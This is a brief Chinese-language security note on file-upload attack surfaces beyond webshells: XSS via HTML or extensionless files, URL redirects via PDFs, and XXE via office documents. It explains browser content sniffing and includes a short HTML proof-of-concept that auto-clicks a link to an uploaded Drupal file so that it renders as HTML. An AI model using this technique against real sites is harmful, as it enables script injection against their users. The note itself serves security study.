现在仅仅只是一些解析脚本拿到webshell吗？背后可能还存在ImageTragick、Ghostscript等一些处理导致问题，亦或者可以上传html导致xss，或者是pdf导致任意url跳转，或者是xls，docx导致xxe等等

1、空后缀的文件 -> xss

chrome下

浏览器首先会根据服务端给出的content-type解析页面，而服务端一般不会给空后缀的文件设置content-type，或者设置为application/octet-stream
其次浏览器会根据文件内容做简单的判断，如果文件的开头为<html>，则部分浏览器会将其解析为html
部分浏览器还可能会设置默认的content-type，但大部分浏览器会选择不解析该文件。

```
<html>
<head>
</head>
  <body>
  <a id='a' href="http://127.0.0.1/drupal-8.6.2/sites/default/files/2019-04/_6" type="text/html">321321</a>

  <script type="text/javascript">
    var a  = document.getElementById('a')
    a.click()
  </script>
  </body>
</html>
```

https://paper.seebug.org/897/

2、允许pdf后缀 -> url跳转

https://paper.tuisec.win/detail/17f0178288dd974


